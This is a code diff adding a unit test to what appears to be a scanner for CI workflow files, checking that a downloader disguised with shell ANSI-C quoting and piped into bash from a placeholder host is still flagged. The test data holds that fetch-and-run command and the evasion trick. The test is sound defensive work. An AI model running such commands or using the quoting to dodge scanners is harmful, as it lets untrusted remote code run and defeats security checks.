@@ -1056,3 +1056,12 @@ test('Codex P1: quote-concatenated downloader command is still risky',()=>{
   assert.ok(rules(result).includes('REMOTE_SHELL_PIPELINE')||result.status==='INCOMPLETE',JSON.stringify({downloader,result}));
  }
 });
+
+test('Codex P1: ANSI-C fragments in downloader command remain risky',()=>{
+ for(const downloader of ["c$''url","c$'u'rl","w$''get"]){
+  const src=['on: push','jobs:','  audit:','    steps:',
+   '      - run: '+downloader+' https://example.invalid/payload | bash'].join('\n');
+  const v=scan(src);
+  assert.ok(rules(v).includes('REMOTE_SHELL_PIPELINE')||v.status==='INCOMPLETE',JSON.stringify({downloader,v}));
+ }
+});
